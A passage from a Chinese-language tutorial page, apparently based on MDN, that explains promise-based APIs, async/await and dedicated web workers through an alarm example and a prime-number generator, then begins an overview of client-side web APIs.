&#125;);<br>&#125;<br></code></pre></td></tr></table></figure><p>此函数创建并且返回一个新的 <code>Promise</code>。对于执行器中的 promise，我们：</p><ul><li>检查 <code>delay</code>（延迟）是否为负数，如果是的话就抛出一个错误。</li><li>调用 <code>window.setTimeout()</code>，传递一个回调函数和 <code>delay</code>（延迟）。当计时器过期时回调会被调用，在回调函数内，我们调用了 <code>resolve</code>，并且传递了 <code>&quot;Wake up!&quot;</code> 消息。</li></ul><h4 id="使用-alarm-API"><a href="#使用-alarm-API" class="headerlink" title="使用 alarm() API"></a>使用 alarm() API</h4><p>这一部分同上一篇文章是相当相似的。我们可以调用 <code>alarm()</code>，在返回的 promise 中调用 <code>then()</code> 和 <code>catch()</code> 来设置 promise 兑现和拒绝状态的处理器。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> name = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelector</span>(<span class="hljs-string">&#x27;#name&#x27;</span>);<br><span class="hljs-keyword">const</span> delay = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelector</span>(<span class="hljs-string">&#x27;#delay&#x27;</span>);<br><span class="hljs-keyword">const</span> button = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelector</span>(<span class="hljs-string">&#x27;#set-alarm&#x27;</span>);<br><span class="hljs-keyword">const</span> output = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelector</span>(<span class="hljs-string">&#x27;#output&#x27;</span>);<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">alarm</span>(<span class="hljs-params">person, delay</span>) &#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function">(<span class="hljs-params">resolve, reject</span>) =&gt;</span> &#123;<br>    <span class="hljs-keyword">if</span> (delay &lt; <span class="hljs-number">0</span>) &#123;<br>      <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">&#x27;Alarm delay must not be negative&#x27;</span>);<br>    &#125;<br>    <span class="hljs-variable language_">window</span>.<span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>      <span class="hljs-title function_">resolve</span>(<span class="hljs-string">`Wake up, <span class="hljs-subst">$&#123;person&#125;</span>!`</span>);<br>    &#125;, delay);<br>  &#125;);<br>&#125;<br><br>button.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;click&#x27;</span>, <span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-title function_">alarm</span>(name.<span class="hljs-property">value</span>, delay.<span class="hljs-property">value</span>)<br>    .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">message</span> =&gt;</span> output.<span class="hljs-property">textContent</span> = message)<br>    .<span class="hljs-title function_">catch</span>(<span class="hljs-function"><span class="hljs-params">error</span> =&gt;</span> output.<span class="hljs-property">textContent</span> = <span class="hljs-string">`Couldn&#x27;t set alarm: <span class="hljs-subst">$&#123;error&#125;</span>`</span>);<br>&#125;);<br></code></pre></td></tr></table></figure><iframe class="sample-code-frame" title="使用 alarm() API sample" id="frame_使用_alarm_api" width="600" height="160" src="https://yari-demos.prod.mdn.mozit.cloud/zh-CN/docs/Learn/JavaScript/Asynchronous/Implementing_a_promise-based_API/_sample_.%E4%BD%BF%E7%94%A8_alarm_api.html" loading="lazy" style="box-sizing: content-box; border: 1px solid var(--border-primary); max-width: 100%; width: calc((100% - 2rem) - 2px); background: rgb(255, 255, 255); border-radius: var(--elem-radius); padding: 1rem;"></iframe><p>尝试对 “Name” 和 “Delay” 设置不同的值。尝试为 “Delay” 设置一个负值。</p><h4 id="在-alarm-API-上使用-async-和-await"><a href="#在-alarm-API-上使用-async-和-await" class="headerlink" title="在 alarm() API 上使用 async 和 await"></a>在 alarm() API 上使用 async 和 await</h4><p>自从 <code>alarm()</code> 返回了一个 <code>Promise</code>，我们可以对它做任何我们可以对其他任何 promise 做的事情：<code>Promise.all()</code>，和 <code>async</code> &#x2F; <code>await</code>：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> name = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelector</span>(<span class="hljs-string">&#x27;#name&#x27;</span>);<br><span class="hljs-keyword">const</span> delay = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelector</span>(<span class="hljs-string">&#x27;#delay&#x27;</span>);<br><span class="hljs-keyword">const</span> button = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelector</span>(<span class="hljs-string">&#x27;#set-alarm&#x27;</span>);<br><span class="hljs-keyword">const</span> output = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelector</span>(<span class="hljs-string">&#x27;#output&#x27;</span>);<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">alarm</span>(<span class="hljs-params">person, delay</span>) &#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function">(<span class="hljs-params">resolve, reject</span>) =&gt;</span> &#123;<br>    <span class="hljs-keyword">if</span> (delay &lt; <span class="hljs-number">0</span>) &#123;<br>      <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">&#x27;Alarm delay must not be negative&#x27;</span>);<br>    &#125;<br>    <span class="hljs-variable language_">window</span>.<span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>      <span class="hljs-title function_">resolve</span>(<span class="hljs-string">`Wake up, <span class="hljs-subst">$&#123;person&#125;</span>!`</span>);<br>    &#125;, delay);<br>  &#125;);<br>&#125;<br><br>button.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;click&#x27;</span>, <span class="hljs-keyword">async</span> () =&gt; &#123;<br>  <span class="hljs-keyword">try</span> &#123;<br>    <span class="hljs-keyword">const</span> message = <span class="hljs-keyword">await</span> <span class="hljs-title function_">alarm</span>(name.<span class="hljs-property">value</span>, delay.<span class="hljs-property">value</span>);<br>    output.<span class="hljs-property">textContent</span> = message;<br>  &#125;<br>  <span class="hljs-keyword">catch</span> (error) &#123;<br>    output.<span class="hljs-property">textContent</span> = <span class="hljs-string">`Couldn&#x27;t set alarm: <span class="hljs-subst">$&#123;error&#125;</span>`</span>;<br>  &#125;<br>&#125;);<br></code></pre></td></tr></table></figure><iframe class="sample-code-frame" title="在 alarm() API 上使用 async 和 await sample" id="frame_在_alarm_api_上使用_async_和_await" width="600" height="160" src="https://yari-demos.prod.mdn.mozit.cloud/zh-CN/docs/Learn/JavaScript/Asynchronous/Implementing_a_promise-based_API/_sample_.%E5%9C%A8_alarm_api_%E4%B8%8A%E4%BD%BF%E7%94%A8_async_%E5%92%8C_await.html" loading="lazy" style="box-sizing: content-box; border: 1px solid var(--border-primary); max-width: 100%; width: calc((100% - 2rem) - 2px); background: rgb(255, 255, 255); border-radius: var(--elem-radius); padding: 1rem;"></iframe><h3 id="3-8-workers简介"><a href="#3-8-workers简介" class="headerlink" title="3.8 workers简介"></a>3.8 workers简介</h3><p>在”异步 JavaScript” 模块的最后一篇文章中，我们将介绍 workers，它使您能够在单独执行 <a href="https://developer.mozilla.org/zh-CN/docs/Glossary/Thread">线程</a> 中运行一些任务。</p><p>在本模块的第一篇文章中，我们看到了当在你的程序中具有一个长期运行的的同步任务时发生了什么 ── 整个窗口变得完全没有响应。从根本上讲，出现这种情况的原因是程序是单线程的。一个线程是程序遵循的一系列指令。因为程序由一个线程组成，它在同一时间只能做一件事情：所以如果它正在等待我们的长期运行的同步调用返回，它就不能做其他任何事情。</p><p>Workers 给了你在不同线程中运行某些任务的能力，因此你可以启动任务，然后继续其他的处理（例如处理用户操作）。</p><p>但是这是要付出代价的。对于多线程代码，你永远不知道你的线程什么时候将会被挂起，其他线程将会得到运行的机会。因此，如果两个线程都可以访问相同的变量，那么变量就有可能在任何时候发生意外的变化，这将导致很难发现的 Bug。</p><p>为了避免 Web 中的这些问题，你的主代码和你的 worker 代码永远不能直接访问彼此的变量。Workers 和主代码运行在完全分离的环境中，只有通过相互发送消息来进行交互。特别是，这意味着 workers 不能访问 DOM（窗口、文档、页面元素等等）。</p><p>有三种不同类型的 workers：</p><ul><li>dedicated workers</li><li>shared workers</li><li>service workers</li></ul><p>在本文中，我们将介绍第一类 workers 的一个例子，然后简要的讨论另外两类。</p><h4 id="使用-web-workers"><a href="#使用-web-workers" class="headerlink" title="使用 web workers"></a>使用 web workers</h4><p>还记得在第一篇文章中，我们有一个计算质数的页面吗？我们将使用一个 worker 来运行质数运算，因此我们的页面对用户操作保持响应。</p><h4 id="同步的质数生成器"><a href="#同步的质数生成器" class="headerlink" title="同步的质数生成器"></a>同步的质数生成器</h4><p>让我们先看一下我们上一个例子中的 JavaScript：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">generatePrimes</span>(<span class="hljs-params">quota</span>) &#123;<br><br>  <span class="hljs-keyword">function</span> <span class="hljs-title function_">isPrime</span>(<span class="hljs-params">n</span>) &#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> c = <span class="hljs-number">2</span>; c &lt;= <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">sqrt</span>(n); ++c) &#123;<br>      <span class="hljs-keyword">if</span> (n % c === <span class="hljs-number">0</span>) &#123;<br>          <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>       &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>  &#125;<br><br>  <span class="hljs-keyword">const</span> primes = [];<br>  <span class="hljs-keyword">const</span> maximum = <span class="hljs-number">1000000</span>;<br><br>  <span class="hljs-keyword">while</span> (primes.<span class="hljs-property">length</span> &lt; quota) &#123;<br>    <span class="hljs-keyword">const</span> candidate = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">floor</span>(<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>() * (maximum + <span class="hljs-number">1</span>));<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_">isPrime</span>(candidate)) &#123;<br>      primes.<span class="hljs-title function_">push</span>(candidate);<br>    &#125;<br>  &#125;<br><br>  <span class="hljs-keyword">return</span> primes;<br>&#125;<br><br><span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelector</span>(<span class="hljs-string">&#x27;#generate&#x27;</span>).<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;click&#x27;</span>, <span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-keyword">const</span> quota = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelector</span>(<span class="hljs-string">&#x27;#quota&#x27;</span>).<span class="hljs-property">value</span>;<br>  <span class="hljs-keyword">const</span> primes = <span class="hljs-title function_">generatePrimes</span>(quota);<br>  <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelector</span>(<span class="hljs-string">&#x27;#output&#x27;</span>).<span class="hljs-property">textContent</span> = <span class="hljs-string">`Finished generating <span class="hljs-subst">$&#123;quota&#125;</span> primes!`</span>;<br>&#125;);<br><br><span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelector</span>(<span class="hljs-string">&#x27;#reload&#x27;</span>).<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;click&#x27;</span>, <span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelector</span>(<span class="hljs-string">&#x27;#user-input&#x27;</span>).<span class="hljs-property">value</span> = <span class="hljs-string">&#x27;Try typing in here immediately after pressing &quot;Generate primes&quot;&#x27;</span>;<br>  <span class="hljs-variable language_">document</span>.<span class="hljs-property">location</span>.<span class="hljs-title function_">reload</span>();<br>&#125;);<br></code></pre></td></tr></table></figure><p>在这个程序中，在我们调用 <code>generatePrimes()</code> 之后，程序变得完全没有响应。</p><h4 id="用-worker-进行质数生成"><a href="#用-worker-进行质数生成" class="headerlink" title="用 worker 进行质数生成"></a>用 worker 进行质数生成</h4><p>在这个例子中，首先在 <a href="https://github.com/mdn/learning-area/blob/main/javascript/asynchronous/workers/start">https://github.com/mdn/learning-area/blob/main/javascript/asynchronous/workers/start</a> 将文件拷贝到本地。在这个目录下有四个文件：</p><ul><li>index.html</li><li>style.css</li><li>main.js</li><li>generate.js</li></ul><p>“index.html” 文件和 “style.css” 文件已完成：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;main.js&quot;</span> <span class="hljs-attr">defer</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;style.css&quot;</span><span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;stylesheet&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><br>  <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">&quot;quota&quot;</span>&gt;</span>Number of primes:<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;quota&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;quota&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;1000000&quot;</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;generate&quot;</span>&gt;</span>Generate primes<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;reload&quot;</span>&gt;</span>Reload<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">textarea</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;user-input&quot;</span> <span class="hljs-attr">rows</span>=<span class="hljs-string">&quot;5&quot;</span> <span class="hljs-attr">cols</span>=<span class="hljs-string">&quot;62&quot;</span>&gt;</span>Try typing in here immediately after pressing &quot;Generate primes&quot;<span class="hljs-tag">&lt;/<span class="hljs-name">textarea</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;output&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">textarea</span> &#123;<br>  <span class="hljs-attribute">display</span>: block;<br>  <span class="hljs-attribute">margin</span>: <span class="hljs-number">1rem</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>“main.js” 和 “generate.js” 文件是空的。我们将向 “main.js” 中添加主代码，向 “generate.js” 中添加 worker 代码。</p><p>首先，我们可以看到 worker 代码被保存在一个与主代码隔离的脚本中。我们还可以看到，在上面的 “index.html” 中，只有主代码被包含在 <code>&lt;script&gt;</code> 标签中。</p><p>现在将下面的代码拷贝到 “main.js”中：</p><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs dart"><span class="hljs-comment">// 在 &quot;generate.js&quot; 中创建一个新的 worker</span><br><span class="hljs-keyword">const</span> worker = <span class="hljs-keyword">new</span> Worker(<span class="hljs-string">&#x27;./generate.js&#x27;</span>);<br><br><span class="hljs-comment">// 当用户点击 &quot;Generate primes&quot; 时，给 worker 发送一条消息。</span><br><span class="hljs-comment">// 消息中的 command 属性是 &quot;generate&quot;, 还包含另外一个属性 &quot;quota&quot;，即要生成的质数。</span><br><span class="hljs-built_in">document</span>.<span class="hljs-built_in">querySelector</span>(<span class="hljs-string">&#x27;#generate&#x27;</span>).addEventListener(<span class="hljs-string">&#x27;click&#x27;</span>, () =&gt; &#123;<br>  <span class="hljs-keyword">const</span> quota = <span class="hljs-built_in">document</span>.<span class="hljs-built_in">querySelector</span>(<span class="hljs-string">&#x27;#quota&#x27;</span>).value;<br>  worker.postMessage(&#123;<br>    command: <span class="hljs-string">&#x27;generate&#x27;</span>,<br>    quota: quota<br>  &#125;);<br>&#125;);<br><br><span class="hljs-comment">// 当 worker 给主线程回发一条消息时，为用户更新 output 框，包含生成的质数（从 message 中获取）。</span><br>worker.addEventListener(<span class="hljs-string">&#x27;message&#x27;</span>, message =&gt; &#123;<br>  <span class="hljs-built_in">document</span>.<span class="hljs-built_in">querySelector</span>(<span class="hljs-string">&#x27;#output&#x27;</span>).textContent = `Finished generating $&#123;message.data&#125; primes!`;<br>&#125;);<br><br><span class="hljs-built_in">document</span>.<span class="hljs-built_in">querySelector</span>(<span class="hljs-string">&#x27;#reload&#x27;</span>).addEventListener(<span class="hljs-string">&#x27;click&#x27;</span>, () =&gt; &#123;<br>  <span class="hljs-built_in">document</span>.<span class="hljs-built_in">querySelector</span>(<span class="hljs-string">&#x27;#user-input&#x27;</span>).value = <span class="hljs-string">&#x27;Try typing in here immediately after pressing &quot;Generate primes&quot;&#x27;</span>;<br>  <span class="hljs-built_in">document</span>.location.reload();<br>&#125;);<br></code></pre></td></tr></table></figure><ul><li>首先，我们使用 <a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Worker/Worker"><code>Worker()</code></a> 构造函数创建 worker。我们传递一个指向 worker 脚本的 URL。只要 worker 被创建了，woker 脚本就会执行。</li><li>其次，与同步版本一样，我们向 “Generate primes” 按钮添加一个click事件处理器。但是现在，我们不再调用generatePrimes()函数，而是使用<code>worker.postMessage()</code>向 worker 发送一条消息。这条消息可以携带一个参数，在本示例中我们传递一个包含两个属性的 JSON 对象：<ul><li><code>command</code>：一个用于标识我们希望 worker 所做事情的字符串（以防我们的 worker 可以做多个事情）。</li><li><code>quota</code>：要生成的质数的数量。</li></ul></li><li>然后，我们向 worker 添加一个 <code>message</code> 消息处理器。这样 worker 就能告诉我们它是什么时候完成的，并且传递给我们任何结果数据。我们的处理器从消息的 <code>data</code> 属性获取数据，然后将其写入 output 元素（数据与 <code>quota</code> 是完全相同的，这虽然没有意义，但是这展示了其中原理）。</li><li>最后，我们为 “Reload” 按钮实现了 <code>click</code> 事件处理器。这与同步版本完全相同。</li></ul><p>现在到 worker 代码了。拷贝下面的代码到 “generate.js” 中：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">// 监听主线程中的消息。</span><br><span class="hljs-comment">// 如果消息中的 command 是 &quot;generate&quot;，则调用 `generatePrimse()`</span><br><span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&quot;message&quot;</span>, <span class="hljs-function"><span class="hljs-params">message</span> =&gt;</span> &#123;<br>  <span class="hljs-keyword">if</span> (message.<span class="hljs-property">data</span>.<span class="hljs-property">command</span> === <span class="hljs-string">&#x27;generate&#x27;</span>) &#123;<br>    <span class="hljs-title function_">generatePrimes</span>(message.<span class="hljs-property">data</span>.<span class="hljs-property">quota</span>);<br>  &#125;<br>&#125;);<br><br><span class="hljs-comment">// 生成质数 (非常低效)</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">generatePrimes</span>(<span class="hljs-params">quota</span>) &#123;<br><br>  <span class="hljs-keyword">function</span> <span class="hljs-title function_">isPrime</span>(<span class="hljs-params">n</span>) &#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> c = <span class="hljs-number">2</span>; c &lt;= <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">sqrt</span>(n); ++c) &#123;<br>      <span class="hljs-keyword">if</span> (n % c === <span class="hljs-number">0</span>) &#123;<br>          <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>       &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>  &#125;<br><br>  <span class="hljs-keyword">const</span> primes = [];<br>  <span class="hljs-keyword">const</span> maximum = <span class="hljs-number">1000000</span>;<br><br>  <span class="hljs-keyword">while</span> (primes.<span class="hljs-property">length</span> &lt; quota) &#123;<br>    <span class="hljs-keyword">const</span> candidate = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">floor</span>(<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>() * (maximum + <span class="hljs-number">1</span>));<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_">isPrime</span>(candidate)) &#123;<br>      primes.<span class="hljs-title function_">push</span>(candidate);<br>    &#125;<br>  &#125;<br><br>  <span class="hljs-comment">// 完成后给主线程发送一条包含我们生成的质数数量的消息消息。</span><br>  <span class="hljs-title function_">postMessage</span>(primes.<span class="hljs-property">length</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>请记住，只要主脚本创建 worker，这些代码就会运行。</p><p>worker 要做的第一件事情就是开始监听来自主脚本的消息。这通过使用 <code>addEventListener()</code> 实现，它在 worker 中是一个全局函数。在 <code>message</code> 事件处理器内部，事件的 <code>data</code> 属性包含一个来自主脚本的参数的副本。如果主脚本传递 <code>generate</code> 命令，我们就调用 <code>generatePrimes()</code>，传入来自消息事件的 <code>quota</code> 值。</p><p><code>generatePrimes()</code> 函数与同步版本类似，只不过我们在完成后向主脚本发送一条消息，而不是返回一个值。我们对此使用 <a href="https://developer.mozilla.org/en-US/docs/Web/API/DedicatedWorkerGlobalScope/postMessage"><code>postMessage()</code> (en-US)</a> 函数，就像在 worker 中 <code>addEventListener</code>是全局函数一样。如我们所见，主脚本正在监听这条消息并且将会在收到消息后更新 DOM。</p><p><strong>备注：</strong> 要运行此站点，你必须运行一个本地 web 服务器，因为 file:&#x2F;&#x2F; URLs 不允许加载 workers。参考我们的<a href="https://developer.mozilla.org/zh-CN/docs/Learn/Common_questions/Tools_and_setup/set_up_a_local_testing_server">设置一个本地测试服务器</a>的指导。完成后，你应该可以点击 “Generate primes” 并且使你的主页面保持响应。 如果你在创建和运行这个样例的过程中有疑问，你可以在 <a href="https://github.com/mdn/learning-area/blob/main/javascript/asynchronous/workers/finished">https://github.com/mdn/learning-area/blob/main/javascript/asynchronous/workers/finished</a> 查看完成后的版本，并且在 <a href="https://mdn.github.io/learning-area/javascript/asynchronous/workers/finished">https://mdn.github.io/learning-area/javascript/asynchronous/workers/finished</a> 进行在线尝试。</p><h4 id="其他类型的-worker"><a href="#其他类型的-worker" class="headerlink" title="其他类型的 worker"></a>其他类型的 worker</h4><p>我们刚刚创建的 worker 被称为 <em>dedicated worker</em>。这意味着它由一个脚本实例使用。</p><p>不过，还有其他类型的 worker：</p><ul><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/API/SharedWorker"><code>SharedWorker</code></a> 可以由运行在不同窗口中的多个不同脚本共享。</li><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Service_Worker_API"><em>Service worker</em></a> 的行为就像代理服务器，缓存资源以便于 web 应用程序可以在用户离线时工作。他们是<a href="https://developer.mozilla.org/zh-CN/docs/Web/Progressive_web_apps">渐进式 Web 应用</a>的关键组件。</li></ul><h3 id="3-9-客户端web-api简介"><a href="#3-9-客户端web-api简介" class="headerlink" title="3.9 客户端web api简介"></a>3.9 客户端web api简介</h3><h4 id="API-可以做什么？"><a href="#API-可以做什么？" class="headerlink" title="API 可以做什么？"></a>API 可以做什么？</h4><p>在主流浏览器中有大量的可用 API，您可以在代码中做许多的事情，对此可以查看<a href="https://developer.mozilla.org/zh-CN/docs/Web/API">MDN API index page</a>。</p><h4 id="常见浏览器-API"><a href="#常见浏览器-API" class="headerlink" title="常见浏览器 API"></a>常见浏览器 API</h4><p>特别地，您将使用的最常见的浏览器 API 类别（以及我们将更详细地介绍的）是：</p><ul><li><strong>操作文档的 API</strong>内置于浏览器中。最明显的例子是<a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Document_Object_Model">DOM（文档对象模型）</a>API，它允许您操作 HTML 和 CSS — 创建、移除以及修改 HTML，动态地将新样式应用到您的页面，等等。每当您看到一个弹出窗口出现在一个页面上，或者显示一些新的内容时，这都是 DOM 的行为。您可以在在<a href="https://developer.mozilla.org/zh-CN/docs/Learn/JavaScript/Client-side_web_APIs/Manipulating_documents">Manipulating documents</a>中找到关于这些类型的 API 的更多信息。</li><li><strong>从服务器获取数据的 API</strong> 用于更新网页的一小部分是相当好用的。这个看似很小的细节能对网站的性能和行为产生巨大的影响 — 如果您只是更新一个股票列表或者一些可用的新故事而不需要从服务器重新加载整个页面将使网站或应用程序感觉更加敏感和“活泼”。使这成为可能的 API 包括<a href="https://developer.mozilla.org/zh-CN/docs/Web/API/XMLHttpRequest"><code>XMLHttpRequest</code></a>和<a 